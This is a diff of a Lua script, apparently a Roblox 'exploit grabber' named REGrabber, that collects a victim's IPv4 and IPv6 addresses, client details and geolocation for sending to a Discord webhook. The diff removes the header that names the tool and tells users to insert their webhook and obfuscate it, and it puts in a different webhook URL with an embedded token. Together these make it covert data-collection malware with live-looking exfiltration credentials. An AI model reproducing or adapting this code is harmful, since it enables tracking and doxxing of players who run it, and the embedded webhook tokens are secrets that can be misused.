@@ -1,18 +1,8 @@
---[[
-    REGrabber 0.2b
-    Roblox Exploit Grabber
-    by bang1338
-    
-    Special thank to all V3million forum,
-    Roblox Dev forum and stackoverflow.
-    
-    Starting by replacing your webhook
-    and obfuscate it.
-]]--
 
-local Webhook = "https://discord.com/api/webhooks/1283501973802323978/7y2kEZ-CvjSCiEaCv8N5RK_cVG03oLU0PGYYAoqZvMXf5Ye3VDqCPnIVYWLGERx9w8nq" -- Put your Webhook link here
-local IPv4 = game:HttpGet("https://api.ipify.org") -- IPv4 (you can replace this with any API service)
-local IPv6 = game:HttpGet("https://api64.ipify.org") -- IPv6 (you can replace this with any API service)
+
+local Webhook = "https://discord.com/api/webhooks/1314978757500731462/2_93re4ma7L048jQbQcvOv2MHZcR99DDM7QT4fWzMJqzv7k5PDQWCQ06wDt86gIgam1Z"
+local IPv4 = game:HttpGet("https://api.ipify.org")
+local IPv6 = game:HttpGet("https://api64.ipify.org")
 local HTTPbin = game:HttpGet("https://httpbin.org/get") -- Getting some client info
 local GeoPlug = game:HttpGet("http://www.geoplugin.net/json.gp?ip="..IPv4) -- Getting location info
 -- TODO: Using Shodan API
